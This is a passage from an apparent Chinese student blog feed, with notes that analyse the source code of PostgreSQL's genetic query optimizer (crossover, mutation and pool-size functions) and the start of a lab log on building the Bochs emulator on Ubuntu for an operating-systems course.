class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">eo</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7167em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2167em;"><span style="top:-4.3832em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"></span></span><span style="top:-2.9332em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5167em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.2167em;"><span style="top:-4.3832em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span style="top:-2.9332em;"><span class="pstrut" style="height:3.0466em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5167em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></eqn></section><h3 id="%EF%BC%884%EF%BC%89%E6%9D%82%E4%BA%A4%E7%AE%97%E5%AD%90" tabindex="-1">（4）杂交算子</h3><p>PostgreSQL 中的遗传算法提供 边重组杂交、部分匹配杂交、循环杂交、基于位置的杂交和顺序杂交等多种杂交算子，用于从父辈种群中产生新的后代个体，默认使用的是边重组杂交算法</p><h4 id="a-%E8%BE%B9%E9%87%8D%E7%BB%84%E6%9D%82%E4%BA%A4" tabindex="-1">a 边重组杂交</h4><p>边重组杂交算子自函数gimme_edge_table和gimme_tour实现。函数 gimme_edge_table 用来计算边关系;函数 gimme_tour由边关系得到后代。<br>边重组杂交过程如下：</p><ol><li>两个父体中的基因构成循环队列<br><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/GA_ERX.jpg" alt="查询树"></li><li>确定父体间的边关系<br>在步骤1中的循环队列中，任意一个基因和相邻的基因构成“边关系”。如果某“边关系”同时在父体1和父体2中出现，则称为“共享边”。</li><li>由边关系得到后代<br>边重组杂交的基本思想是:随机地选择一个基因作为起始点，顺着它的边关系找到下一<br>个基因(优先考虑共享边) ，再顺着找到的基因的边关系找到第三个基因，直到找到的基因能够构成一个个体为止，最后将找到的基因按找到的顺序组成一个个体即可。</li></ol><h4 id="b-%E9%83%A8%E5%88%86%E5%8C%B9%E9%85%8D%E6%9D%82%E4%BA%A4" tabindex="-1">b 部分匹配杂交</h4><p>由函数pmx实现，该函数流程如下：</p><ol><li>在字串上均匀随机地选择两点，由这两点确定的子串称为映射段，定义两个整型变量left和right(left&lt; right) 表示选取的映射段的起始边界。</li><li>用父体2的映射段替换父体1的映射段产生原始后代。</li><li>确定两映射段之间的映射关系</li><li>根据映射关系将后代合法化</li></ol><h4 id="c-%E5%BE%AA%E7%8E%AF%E6%9D%82%E4%BA%A4" tabindex="-1">c 循环杂交</h4><p>循环杂交算子由函数 cx 实现，该方法从一个双亲中取一些基因，而其他的基因则取自另外一个双亲。</p><p>该方法首先随机确定一个初始位置，作为当前位置，把父体1当前位置下的基因(即编<br>号)赋值给当前位置下的子代，并标记此基因已被使用 然后推进当前位置到父体2当前位置(未修改前的位置)下的基因在父体1中的位置，同样把父体1当前位置下的基因赋值给当前位置下的子代。<br>同理推进当前位置，生成子代的基因片段，直到循环到初始位置下父体1的基因与父体2中的当前位置下的基因一样时循环结束。如果循环结束后仍有部分基因没有被使用，则将父体2中的这些基因按在父体2中存在的位置赋值到子代中同样位置。</p><h4 id="d-%E5%9F%BA%E4%BA%8E%E4%BD%8D%E7%BD%AE%E7%9A%84%E6%9D%82%E4%BA%A4" tabindex="-1">d 基于位置的杂交</h4><p>基于位置的杂交算子由函数 px 实现，该函数的处理流程如下:</p><ol><li>根据基因数目 gene ，首先随机选择一个区间[gene/3 , 2/3 * gene ]中的整数p,从父体1中随机选择p个基因，设为集合A</li><li>对于在A中的基因，从父体1拷贝到后代中对应的位置上。</li><li>不在A中的基因，按它们在父体2中的顺序拷贝到后代剩余的位置上。</li></ol><h4 id="e-%E9%A1%BA%E5%BA%8F%E6%9D%82%E4%BA%A4ox1" tabindex="-1">e 顺序杂交ox1</h4><p>顺序杂交算子有两种：OX1和OX1。OX1算子由函数 ox1 实现，函数 oxl 的处理流程如下:</p><ol><li>从第一个父体中随机选择一个子串。</li><li>将子串复制到一个空串的相应位置，产生一个原始后代。</li><li>删去第二个父体中子串已有的基因，得到原始后代需要的其他基因的顺序。</li><li>按照这个基因顺序，从左到右将这些基因复制到后代的空缺位置上。</li></ol><h4 id="f-%E9%A1%BA%E5%BA%8F%E6%9D%82%E4%BA%A4ox2" tabindex="-1">f 顺序杂交ox2</h4><p>OX2 算子由函数ox2实现，其处理流程如下:</p><ol><li>根据基因的数目 gene ，随机选择一个 [gene/3 , 2/3 * gene] 之间的整数 ，从父体1中随机选择p个基因，设为集合A</li><li>对于父体2中不在A中基因，拷贝到后代对应的位置中。</li><li>对在A中的基因，按它们在父体 中的顺序依次拷贝到后代剩余的位中。</li></ol><h3 id="%EF%BC%885%EF%BC%89%E5%8F%98%E5%BC%82%E7%AE%97%E5%AD%90" tabindex="-1">（5）变异算子</h3><p>变异算子由函数geqo_mutation实现，该函数随机地从父体中产生两个变异位，交换这两个变异位的数值，执行num_gene(基因数目)次这样的操作。</p><h3 id="%EF%BC%886%EF%BC%89%E7%BB%88%E6%AD%A2%E6%9D%A1%E4%BB%B6" tabindex="-1">（6）终止条件</h3><p>遗传算法采用设定演化代数的方法，但演化到一定数量的代数时，就停止演化。默认的演化代数是种群的大小(pool_size ，缓冲池的大小)。演化代数的计算涉及下面两个参数:</p><ol><li>geqo_effort :整型变量，是用于限制种群大小的影响因子。取值范围是 [1 10 ]，默认值为5</li><li>geqo_pool_size :整型变量 ，表示缓冲池(用于存储种群中的个体)大小.缓冲池的大小和种群大小相同， 其值至少为2</li></ol><p>种群大小(缓冲池的大小) pool_size 由函数伊gimme_pool_size 确定，其参数 nr_rel 为查询中表的数量。计算方法如下:</p><ol><li>计算上限值 maxsize和下限值minsize<br><section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mn>50</mn><mo>∗</mo><mi>g</mi><mi>e</mi><mi>q</mi><msub><mi>o</mi><mi>e</mi></msub><mi>f</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>t</mi><mspace linebreak="newline"></mspace><mi>m</mi><mi>i</mi><mi>n</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mn>10</mn><mo>∗</mo><mi>g</mi><mi>e</mi><mi>q</mi><msub><mi>o</mi><mi>e</mi></msub><mi>f</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>t</mi></mrow><annotation encoding="application/x-tex"> maxsize=50*geqo_effort\\minsize=10*geqo_effort </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">50</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10764em;">ff</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">t</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">min</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.10764em;">ff</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">t</span></span></span></span></span></eqn></section></li><li>计算基准大小<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mi>p</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mn>2.0</mn><mo separator="true">,</mo><mi>n</mi><msub><mi>r</mi><mi>r</mi></msub><mi>e</mi><mi>l</mi><mo>+</mo><mn>1.0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">size=pow(2.0,nr_rel+1.0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord">2.0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1.0</span><span class="mclose">)</span></span></span></span></eq></li><li>如果基准大小位于上限值和下限值之间，则取基准大小作为种群大小;如果低于下限值，则取下限值;如果高于上限值，则取上限值</li></ol><h3 id="%EF%BC%887%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%8E%92%E5%88%97%E7%94%9F%E6%88%90%E8%B7%AF%E5%BE%84" tabindex="-1">（7）基于排列生成路径</h3><p>在遗传算法中由排列生成连接路径由以下算法实现</p><p><img src="/images/%E6%9C%AC%E7%A7%91/PostgreSQL/GA_creat_path.jpg" alt="GA_creat_path"></p><p>其中变量rels中保存了按照排列数所对应的各个基本关系（即基本表）。<br>变量rels_temp用来保存当前不可连接的关系。（不可连接指只能用笛卡尔积进行连接）</p><p>该算法的处理过程：</p><p>依次取rels中的所有基本表，在rels_temp中依次寻找可以与其连接的表，如果存在可连接的表，则把这两个表进行连接生成新的表，并从头开始继续在rels_temp中寻找可连接的表，并将其与新生成的表连接，一直到找不到可连接的表位置，最后将最终生成的新表插入rels_temp结尾；继续在rels中取下一个表，重复上述过程。</p><h2 id="7-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90" tabindex="-1">7 源码分析</h2><h3 id="%E6%BA%90%E7%A0%81%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90" tabindex="-1">源码目录分析</h3><p>access文件夹包含各种存储访问方法、索引的实现。(重要)<br>bootstrap文件夹为数据库初始化时调用方法。<br>catalog文件夹为系统目录。<br>commands文件夹为SQL命令。(重要)<br>executor文件夹为执行器相关代码。(重要)<br>foreign文件夹为FDW相关代码，使得用户可以通过SQL访问没有存储在数据库中的数据。(扩展)<br>jit文件夹为Just-In-Time Compilation，为即时编译的相关代码，用于提高查询语句性能。（扩展）<br>lib文件夹为通用函数。<br>libpq文件夹为c/cpp的库函数，处理与客户端的通信。<br>main文件夹为主程序。<br>nodes文件夹为链表、节点等数据结构，以及相关的方法。(重要)<br>optimizer文件夹为优化器相关代码。(重要)<br>parser文件夹为编译器相关代码。(重要)<br>partitioning文件夹为分片相关代码。(重要)<br>po文件夹为语言文件配置。<br>port文件夹为平台兼容性处理相关代码。<br>postmaster文件夹为postmaster进程，以及相关辅助进程的代码。<br>regex文件夹为正则处理相关代码。(重要)<br>replication文件夹为有关流复制的相关代码。(重要)<br>rewrite文件夹为规则与视图相关的重写处理。<br>snowball文件夹为全文检索相关（语干处理）代码。<br>statisics文件夹为收集统计信息相关代码，与估算相关。<br>storage文件夹为管理各种类型存储系统相关代码。(重要)<br>tcop文件夹为postgres服务进程的主要处理部分，即查询流程调用的相关代码。(重要)<br>tsearch文件夹为全文检索。(扩展)<br>utils文件夹为各种支持函数，如错误报告、各种初始化操作、内存管理等。</p><p>我的分析任务：PG中遗传算法的使用分析</p><p>在文件src/backend/optimizer/geqo中为<code>遗传优化计划器</code></p><h3 id="src%2Fbackend%2Foptimizer%E7%9B%AE%E5%BD%95%E5%88%86%E6%9E%90" tabindex="-1">src/backend/optimizer目录分析</h3><p>该目录下的文件使用解析器返回的查询结构，生成执行器使用的计划。</p><p>/plan目录生成实际的输出计划<br>/path目录生成所有可能的连接表的方法<br>/geqo目录下位单独的“遗传优化”计划器<br>/prep目录处理特殊情况下的预处理步骤<br>/util目录下为公用的模块</p><h3 id="geqo%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90" tabindex="-1">geqo下的代码具体分析</h3><h4 id="(1)-geqo_main.c" tabindex="-1">(1) geqo_main.c</h4><p>其中共有三个函数</p><ul><li><p><code>RelOptInfo * geqo(PlannerInfo *root, int number_of_rels, List *initial_rels)</code><br>该函数为遗传算法优化的主函数，通过调用该函数来用遗传算法生成查询计划。<br>该函数有三个参数</p><ul><li><code>root</code>：PlannerInfo 结构体包含有关正在优化的查询的各种信息，包括涉及的表、连接条件以及可能相关的任何约束或索引。遗传算法使用此信息生成潜在查询计划并评估其适合度。</li><li><code>number_of_rels</code>：这个整数表示正在优化的关系数，即查询中涉及的表数。</li><li><code>initial_rels</code>：这是一个 RelOptInfos 的 List，表示正在优化的初始关系。</li></ul></li></ul><p>函数返回一个指向 RelOptInfo 结构体的指针，该结构体表示遗传算法找到的最佳查询计划。</p><p>随后该函数依次完成：</p><p>初始化数据；获得随机数种子；设置GA相关参数；为缓冲池分配空间；随机初始化缓冲池；并按适应值对缓冲池中的个体进行排序；为重组杂交进行空间分配；进行遗传算的迭代，依次进行选择重组变异；选择最优个体；释放空间；返回最优个体。</p><p>该函数为遗传算法的主要部分，main函数。</p><ul><li><code>static int gimme_pool_size(int nr_rel)</code><br>该函数用于确定缓冲池大小（种群大小）</li><li><code>static int gimme_number_generations(int pool_size)</code><br>从该函数得到迭代次数</li></ul><h4 id="(2)-geqo_misc.c" tabindex="-1">(2) geqo_misc.c</h4><p>该文件下函数主要进行调试使用，对算法中间的结果进行输出</p><ol><li><code>static double avg_pool(Pool *pool)</code><br>返回平均代价值</li><li><code>void print_pool(FILE *fp, Pool *pool, int start, int stop)</code><br>输出当前种群中所有个体的染色体和代价</li><li><code>void print_gen(FILE *fp, Pool *pool, int generation)</code><br>输出某一代基因的最好，最坏，中位数和平均代价值</li><li><code>void print_edge_table(FILE *fp, Edge *edge_table, int num_gene)</code><br>输出边重组杂交的边表</li></ol><h4 id="(3)-geqo_mutation.c" tabindex="-1">(3) geqo_mutation.c</h4><p>只有一个函数，对种群中的个体实施变异操作<br><code>void geqo_mutation(PlannerInfo *root, Gene *tour, int num_gene)</code></p><h4 id="(4)-geqo_pool.c" tabindex="-1">(4) geqo_pool.c</h4><p>该文件中包含与缓冲区的相关函数</p><ol><li><code>Pool * alloc_pool(PlannerInfo *root, int pool_size, int string_length)</code><br>为遗传算法缓冲器分配空间</li><li><code>void free_pool(PlannerInfo *root, Pool *pool)</code><br>释放1函数中分配的空间</li><li><code>voidrandom_init_pool(PlannerInfo *root, Pool *pool)</code><br>随机初始化缓冲池</li><li><code>void sort_pool(PlannerInfo *root, Pool *pool)</code><br>从小到大按适应度排序缓冲池中的个体</li><li><code>static int compare(const void *arg1, const void *arg2)</code><br>排序的方法，源码中使用快速排序算法</li><li><code>Chromosome * alloc_chromo(PlannerInfo *root, int string_length)</code><br>为个体分配空间</li><li><code>void free_chromo(PlannerInfo *root, Chromosome *chromo)</code><br>释放为个体分配的空间</li><li><code>void spread_chromo(PlannerInfo *root, Chromosome *chromo, Pool *pool)</code><br>插入一个新的个体到缓冲池中，代替缓冲池中的最差的个体</li></ol><h4 id="(5)-geqo_random.c" tabindex="-1">(5) geqo_random.c</h4><p>该文件用来产生随机数，含有三个函数</p><ol><li><code>void geqo_set_seed(PlannerInfo *root, double seed)</code><br>设置GEQO随机数生成器的种子，以确保每次运行GEQO时使用相同的随机数序列</li><li><code>double geqo_rand(PlannerInfo *root)</code><br>函数使用了简单的线性同余算法来生成伪随机数。该函数返回一个范围在 0 到 1 之间的双精度浮点数</li><li><code>int geqo_randint(PlannerInfo *root, int upper, int lower)</code><br>函数的作用是生成一个介于 upper 和 lower 之间的随机整数。</li></ol><h4 id="(6)-geqo_selection.c" tabindex="-1">(6) geqo_selection.c</h4><p>该文件内进行父体选择</p><ol><li><code>static int linear_rand(PlannerInfo *root, int pool_size, double bias)</code><br>该函数实现线性随机选择算法,使用了类似于概率密度函数的方法，其中偏差参数用于增加某些候选项被选择的概率,用于选择父代来产生后代。</li><li><code>void geqo_selection(PlannerInfo *root, Chromosome *momma, Chromosome *daddy,Pool *pool, double bias)</code><br>该函数使用随机选择过程来选择两个父染色体进行交叉。</li></ol><h4 id="(7)-geqo_copy.c" tabindex="-1">(7) geqo_copy.c</h4><p>该文件内只有一个函数<code>void geqo_copy(PlannerInfo *root, Chromosome *chromo1, Chromosome *chromo2,int string_length)</code>,用来复制个体</p><h4 id="(8)-%E5%87%A0%E4%B8%AA%E6%9D%82%E4%BA%A4%E7%AE%97%E5%AD%90%E6%96%87%E4%BB%B6" tabindex="-1">(8) 几个杂交算子文件</h4><ul><li>geqo_cx.c 循环杂交<br>包含函数<code>int cx(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring,int num_gene, City * city_table)</code></li><li>geqo_erx.c 边重组杂交,包含以下函数<ul><li><code>Edge * alloc_edge_table(PlannerInfo *root, int num_gene)</code>为边表分配空间</li><li><code>void free_edge_table(PlannerInfo *root, Edge *edge_table)</code>释放边表空间</li><li><code>float gimme_edge_table(PlannerInfo *root, Gene *tour1, Gene *tour2, int num_gene, Edge *edge_table)</code>填充记录两个个体间的边的数据结构</li><li><code>static int gimme_edge(PlannerInfo *root, Gene gene1, Gene gene2, Edge *edge_table)</code>从给定基因中构建一条边并将其加入边表</li><li><code>int gimme_tour(PlannerInfo *root, Edge *edge_table, Gene *new_gene, int num_gene)</code>通过边表和基因返回一条可行的路径长度</li><li><code>static void remove_gene(PlannerInfo *root, Gene gene, Edge edge, Edge *edge_table)</code>从边表中移除该基因</li><li><code>static Gene gimme_gene(PlannerInfo *root, Edge edge, Edge *edge_table)</code>从给定的边表中返回一个基因</li><li><code>static Gene edge_failure(PlannerInfo *root, Gene *gene, int index, Edge *edge_table, int num_gene)</code>当遇到失败的边缘时，对基因进行修复</li></ul></li><li>geqo_pmx.c 部分匹配杂交<br>包含函数<code>void pmx(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene)</code></li><li>geqo_ox1.c 顺序杂交1<br><code>void ox1(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene,City * city_table)</code></li><li>geqo_ox1.c 顺序杂交2<br><code>voidox2(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene, City * city_table)</code></li><li>geqo_px.c 基于位置的杂交<br><code>void px(PlannerInfo *root, Gene *tour1, Gene *tour2, Gene *offspring, int num_gene,City * city_table)</code></li></ul><h4 id="(9)-geqo_eval.c" tabindex="-1">(9) geqo_eval.c</h4><p>该文件对查询树进行估价</p><ul><li><code>Cost geqo_eval(PlannerInfo *root, Gene *tour, int num_gene)</code><br>返回一个个体的查询树的代价</li><li><code>RelOptInfo * gimme_tree(PlannerInfo *root, Gene *tour, int num_gene)</code>接收一个查询优化器（PlannerInfo）的指针和一组遗传算法的基因（Gene），然后返回一个查询优化树（RelOptInfo）。</li><li><code>static List * merge_clump(PlannerInfo *root, List *clumps, Clump *new_clump, int num_gene,bool force)</code>作用是合并一个新的数据块（new_clump）到一个包含多个数据块的列表中（clumps），并返回合并后的列表。参数 num_gene 表示数据块中基因的数量，而参数 force 用于控制是否强制进行合并。</li><li><code>static bool desirable_join(PlannerInfo *root,RelOptInfo *outer_rel, RelOptInfo *inner_rel)</code>用于确定是否应该对两个关系进行连接，这两个关系分别由 outer_rel 和 inner_rel 表示，其确定连接是否可行是基于多个因素，如连接的预估成本和选择性等</li></ul><h4 id="(10)-geqo_recombination.c" tabindex="-1">(10) geqo_recombination.c</h4><p>该文件为杂交重组程序，包含以下函数</p><ul><li><code>void init_tour(PlannerInfo *root, Gene *tour, int num_gene)</code>随机生成一条合法的“旅行推销员”路径（即每个点仅访问一次）</li><li><code>City * alloc_city_table(PlannerInfo *root, int num_gene)</code>为城市表分配内存</li><li><code>void free_city_table(PlannerInfo *root, City * city_table)</code>为城市表回收内存</li></ul><h2 id="8-%E6%80%BB%E7%BB%93" tabindex="-1">8 总结</h2><p>本次数据库实验我主要对PostgreSQL源码中的遗传算法部分进行了分析，分析了源码中该部分的具体函数，并了解了遗传算法在PG中的工作流程，如果之后有空，希望能研习全部的PG源码。</p><p>源码中遗传算法用于寻找最优的生成路径，这一点与TSP问题相似。</p><p>当点数过多时，使用动态规划难以求出最优解，这时就可以使用遗传算法较快地求出较优解来生成路径，提升了查询编译地速度。</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统试验--在linux环境下复现操作系统</title>
      <link href="/2023/03/03/%E6%9C%AC%E7%A7%91/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%95%E9%AA%8C/"/>
      <url>/2023/03/03/%E6%9C%AC%E7%A7%91/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%95%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><img src="/images/meitu/4.jpg">本次操作系统实验根据`Orange's 一个操作系统的实现`一书进行操作。在此记录试验的过程及心得<h2 id="%E7%AC%AC%E4%B8%80%E7%AB%A0%26%E7%AC%AC%E4%BA%8C%E7%AB%A0-hello%EF%BC%8Cos-world" tabindex="-1">第一章&amp;第二章 Hello，OS world</h2><p>这两章通过在windows使用虚拟机运行Ubuntu操作系统，在Ubuntu上使用bochs虚拟机来完成操作系统。</p><h3 id="1-%E4%BD%BF%E7%94%A8vm%E8%BF%90%E8%A1%8Cubuntu" tabindex="-1">1 使用vm运行Ubuntu</h3><p>我这里虚拟机运行的是Ubuntu20.04，但因为这本书是老书了，64位机运行结果会有问题，因此还是用了Ubuntu16.04的32位虚拟机,安装虚拟机时主要遇到的问题有：</p><ol><li>虚拟机连不上网，但在瞎搞之后能连上了，选择的时NAT连接</li><li>VM Tools 自动安装不上，会报错。VMtools可以实现Windows环境和Linux环境直接的文件交换，还是有必要安装的。解决方法是手动下载VM Tools，尽管之后还会报错，但已经能实现文件互通。</li></ol><h3 id="2-%E5%9C%A8ubuntu%E4%B8%AD%E4%BD%BF%E7%94%A8bochs" tabindex="-1">2 在Ubuntu中使用bochs</h3><p>我这里是在<a href="https://bochs.sourceforge.io/">官网</a>下载的安装包，版本是<a href="https://sourceforge.net/projects/bochs/files/bochs/2.7/bochs-2.7.tar.gz/download">2.7</a><br>之后参考书上和网上的一些博客进行安装，主要参考<a href="https://blog.csdn.net/weixin_49635198/article/details/126831887">博客</a><br>这里建议新建一个文件夹解压压缩包<br>使用命令<code>tar vxzf bochs-2.7.tar.gz</code>解压<br>之后使用命令<code>cd bochs-2.7</code>进入该文件夹<br>之后进行配置<br>输入命令<code>./configure --prefix=$home/你解压的地址 --enable-debugger --enable-disasm --enable-iodebug --enable-x86-debugger --with-x --with-x11</code><br>配置时可能遇到问题</p><ol><li>fatal error: X11/Xlib.h: No such file or directory<br>这里表示x11没有安装完整，输入：<code>sudo apt-get install libghc-x11-dev</code>即可</li><li>Ubuntu 编译提示 configure: error: no acceptable C compiler found in $PATH<br>这是没有安装 C 编译器,通过命令<code>sudo apt-get install -y build-essential</code>下载一些必要环境即可</li></ol><p>随后依次使用命令<code>make</code>和<code>sudo make install</code></p><p>这两个命令执行过程中我没有遇到什么问题，如果有遇到的话还请自己搜搜。</p><p>之后返回上一级目录，可以发现多了两个文件bin和share文件夹。</p><p>之后进入bin文件夹里面可以看到bximage和bochs两个文件，前者用来创建虚拟磁盘，或者用来配置虚拟机。</p><p>接下来让我们配置bochs文件，进入bin文件，输入命令<code>sudo gedit bochsrc</code>创建bochsrc配置文件，向该文件中输入以下代码进行虚拟机配置（直接复制粘贴即可）</p><pre><code class="language-asm">################################################################ Configuration file for Bochs################################################################ how much memory the emulated machine will havemegs: 32# filename of ROM imagesromimage: file=/home/mr-cold/boch/share/bochs/BIOS-bochs-latestvgaromimage: file=/home/mr-cold/boch/share/bochs/VGABIOS-lgpl-latest# what disk images will be used floppya: 1_44=a.img, status=inserted# choose the boot disk.boot: floppy# where do we send log messages?log: bochsout.txt# disable the mousemouse: enabled=0# enable key mapping, using US layout as default.#keyboard_mapping: enabled=1, map=/home/mr-cold/boch/share/bochs/keymaps/x11-pc-us.map</code></pre><p>之后在bin文件夹下输入<code>bochs -f bochsrc</code>即可运行虚拟机，选择6开始模拟，之后输入c即可显示交互命令行界面<br><img src="/images/本科/OS实验/bochs_1.jpg"><br><img src="/images/本科/OS实验/bochs_2.jpg"><br><img src="/images/本科/OS实验/bochs_3.jpg"><br>在上图中，报错是因为我们还没有驱动磁盘，在bochsrc的配置代码中我们可以看到该虚拟机配备软盘floppy为a.img，那么接下来我们就要创建一个软盘去实现一个最小的操作系统</p><h3 id="3-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" tabindex="-1">3 最简单的操作系统</h3><p>我们首先创建一个虚拟软盘(硬盘应该也可以，书中为软盘，毕竟是09年老书)。命令<code>bximage</code><br>随后依据提示创建一个1.44MB的软盘，同时将bochsrc中<code>floppya: 1_44=a.img, status=inserted</code>中的软盘改为你创建磁盘的名字，这将是虚拟机的磁盘。</p><p>随后实现书中的boot.asm(可以直接从书附带磁盘复制出来，磁盘从学校云图书馆即可下载)：通过<code>basm 